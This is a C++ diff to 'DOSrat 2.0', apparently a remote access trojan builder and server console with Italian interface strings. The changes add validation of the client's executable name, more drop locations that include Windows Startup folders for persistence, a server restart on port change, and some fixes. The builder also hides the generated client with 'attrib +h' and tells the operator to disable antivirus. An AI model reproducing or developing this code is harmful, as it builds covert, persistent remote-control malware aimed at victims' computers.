@@ -11,6 +11,7 @@ using namespace std;
 
 string Version = "2.0.0-b.1";
 CLIENT Clients[MAX_CLIENTS];
+atomic<bool> ServerLoopController = true;
 
 #include "Classi.h"
 
@@ -39,6 +40,9 @@ int main()
     VectString Percorsi;
 
     bool CicloMenu = true;
+    int OldPort = 0;
+
+    en.AsciiToHex("Prova");
 
     cli.LoadingPercentage = 0;
     cli.LoadingText = "Caricamento Menu Principale...";
@@ -71,6 +75,7 @@ int main()
     Percorsi.push_back("C:\\Users\\<User>\\AppData\\Local\\Microsoft\\Edge\\User Data");
     Percorsi.push_back("C:\\Users\\<User>\\AppData\\Local\\Microsoft\\WindowsApps");
     Percorsi.push_back("C:\\Users\\<User>\\AppData\\Local\\Temp");
+    Percorsi.push_back("C:\\Users\\<User>\\AppData\\LocalLow\\Microsoft");
     Percorsi.push_back("C:\\Users\\<User>\\AppData\\Roaming\\.minecraft");
     Percorsi.push_back("C:\\Users\\<User>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
     Percorsi.push_back("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp");
@@ -251,6 +256,19 @@ int main()
                             cout << "\nInserisci il nome del file .exe" << endl;
                             StampaPrefix();
                             getline(cin, SettaggiC.ExeName);
+                            if (SettaggiC.ExeName.size() > 4)
+                            {
+                                if (ToLowerCase(SettaggiC.ExeName.substr(SettaggiC.ExeName.size() - 4, 4)) != ".exe")
+                                    SettaggiC.ExeName += ".exe";
+                            }
+                            else
+                            {
+                                tc.SetColor(tc.Red);
+                                cout << "Nome non valido." << endl;
+                                tc.SetColor(tc.Default);
+                                SettaggiC.ExeName = "Client.exe";
+                                Sleep(1500);
+                            }
                             break;
 
                         // Auto Run
@@ -282,7 +300,7 @@ int main()
                             {
                                 cli.StopBar();
                                 tc.SetColor(tc.Red);
-                                cout << "Errore: file \"Build\\Client.exe\" non trovato.\nProva a riscaricare DOSrat 2.0." << endl;
+                                cout << "\nErrore: file \"Build\\Client.exe\" non trovato.\nProva a riscaricare DOSrat 2.0." << endl;
                                 tc.SetColor(tc.Default);
                                 Sleep(5000);
                                 break;
@@ -296,7 +314,7 @@ int main()
                             {
                                 cli.StopBar();
                                 tc.SetColor(tc.Red);
-                                cout << "Errore durante la lettura/scrittura del Client.\nDisattiva l'antivirus e riprova." << endl;
+                                cout << "\nErrore durante la lettura/scrittura del Client.\nDisattiva l'antivirus e riprova." << endl;
                                 tc.SetColor(tc.Default);
                                 Sleep(5000);
                                 break;
@@ -304,6 +322,8 @@ int main()
 
                             cli.LoadingPercentage = 50;
                             cli.LoadingText = "Impostazione attributi";
+
+                            Sleep(250);
 
                             if (SettaggiC.HideExe)
                                 su.NoOutputCMD("attrib +h \"" + SettaggiC.ExeName + "\"");
@@ -323,6 +343,7 @@ int main()
                             tc.SetColor(tc.Default);
 
                             Sleep(1500);
+                            CicloMenu = false;
                             break;
                     }
 
@@ -334,7 +355,7 @@ int main()
 
             // Comandi Comuni
             case 3:
-                return 0;
+                // TODO
                 break;
 
             // Impostazioni
@@ -356,10 +377,30 @@ int main()
 
                         // Porta
                         case 1:
+                            OldPort = SettaggiS.Porta;
+
                             cout << "\nInserisci la porta." << endl;
                             StampaPrefix();
                             cin >> SettaggiS.Porta;
                             cin.ignore();
+
+                            if (OldPort != SettaggiS.Porta)
+                            {
+                                cout << "Riavvio del Server in corso..." << endl;
+                                if (!RestartServer(Server, SettaggiS.Porta))
+                                {
+                                    tc.SetColor(tc.Red);
+                                    cout << "Riavvio del server fallito.\nPremi un tasto per chiudere DOSrat 2.0 ..." << endl;
+                                    tc.SetColor(tc.Default);
+                                    _getch();
+                                    return 0;
+                                }
+                                tc.SetColor(tc.Lime);
+                                cout << "Riavvio completato." << endl;
+                                tc.SetColor(tc.Default);
+                                Sleep(1500);
+                            }
+
                             break;
 
                         // Aggiornamenti
